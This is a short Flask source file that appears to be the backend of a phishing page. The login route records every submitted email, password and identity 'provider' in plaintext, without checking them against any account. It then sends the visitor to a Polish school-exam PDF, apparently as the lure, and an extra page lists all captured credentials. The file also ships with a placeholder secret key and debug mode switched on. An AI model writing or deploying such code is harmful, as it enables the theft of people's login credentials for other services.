import os
from flask import Flask, render_template, request, redirect, jsonify, session
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.secret_key = 'your_secret_key'  # Ensure to set a secret key for session management

db = SQLAlchemy(app)

# Define the User model
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), nullable=False)
    password = db.Column(db.String(120), nullable=False)
    provider = db.Column(db.String(50), nullable=False)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    provider = request.form['provider']

    # Save the user credentials in the database
    new_user = User(email=email, password=password, provider=provider)
    db.session.add(new_user)
    db.session.commit()

    # Track logged-in user by storing the user ID in session
    session['user_id'] = new_user.id

    # Return JSON response for AJAX request
    return jsonify({'status': 'success', 'redirect_url': 'https://arkusze.pl/maturalne/matematyka-2024-czerwiec-matura-podstawowa.pdf'})

@app.route('/logout', methods=['POST'])
def logout():
    session.pop('user_id', None)
    return jsonify({'status': 'logged_out'})

@app.route('/logged-in-users')
def show_logged_in_users():
    # Retrieve all users from the database
    users = User.query.all()
    return render_template('logged_in_users.html', users=users)

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(debug=True)
